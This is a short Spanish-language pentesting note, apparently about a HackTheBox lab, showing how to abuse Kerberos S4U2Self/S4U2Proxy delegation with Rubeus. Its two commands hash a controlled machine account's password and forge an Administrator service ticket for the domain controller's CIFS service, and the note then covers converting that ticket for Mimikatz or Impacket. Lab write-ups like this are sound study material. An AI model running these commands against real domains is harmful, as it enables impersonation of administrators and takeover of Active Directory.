Rubeus es una herramienta que nos permite explotar toda aquella vulnerabilidad relacionada con kerberos:

# Explotación de S4U2Self y S4U2Proxy

Primero tenemos que obtener el hash rc4 de la cuenta de servicio o cuenta de maquina sobre la que tengamos control:

```r
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

![[Pasted image 20260512081056.png]]

Ya con el hash (resaltado en verde) podemos solicitar el TGS del usuario Administrator para el SPN  **`cifs/dc.support.htb`**:

```r
rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

Esto va a dar como resultado el ticket en base64, para usarlo se deben quitar todos los espacios en blanco con [esta](https://www.browserling.com/tools/remove-all-whitespace) pagina y luego desencodearlo en un archivo, ese ticket nos sirve con herramientas de windows como Mimikatz, si queremos usar ese ticket para herramientas en linux, podemos usar [[Impacket-ticketConverter]].
